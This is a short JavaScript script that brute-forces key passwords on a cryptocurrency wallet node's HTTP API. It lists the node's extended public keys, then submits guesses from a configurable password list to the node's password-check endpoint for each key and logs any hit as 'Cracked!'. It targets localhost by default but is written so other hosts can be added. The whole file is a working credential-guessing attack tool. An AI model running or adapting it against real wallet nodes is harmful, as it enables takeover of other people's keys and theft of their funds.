var request = require('request');

// start config
var crack_local = true 
try_pwds = ['111','222']
// end config

url_p1 = []
if (crack_local) {
    url_p1.push('http://localhost')
}

// url_p1.forEach()
url_p1 = url_p1[0]
var xpubs = []
url = url_p1 + ':9888/list-keys'
request(url, function (error, response, body) {
        if (!error && response.statusCode === 200) {
            JSON.parse(body).data.forEach(function(entry) {
                crack_xpub(url_p1, entry.xpub);
            });
        } else {
            console.log("Skip: Fail to vist", url)
        }
});

// crack xpub on url
function crack_xpub(url_p1, xpub) {
    url = url_p1 + ":9888/check-key-password"
    console.log("cracking", url)
    console.log("\tcracking xpub:", xpub)
    try_pwds.forEach(function(pwd) {
        request({
            url: url,
            method: "POST",
            json: {"xpub": xpub, "password": pwd}
            }, function (error, response, body) {
            if (!error && response.statusCode === 200) {
                if (body.data.check_result == true) {
                    console.log("\t\tCracked! password:", pwd)
                }
            } else {
                console.log("error: " + error)
                console.log("response.statusCode: " + response.statusCode)
                console.log("response.statusText: " + response.statusText)
            }
        })
    });
};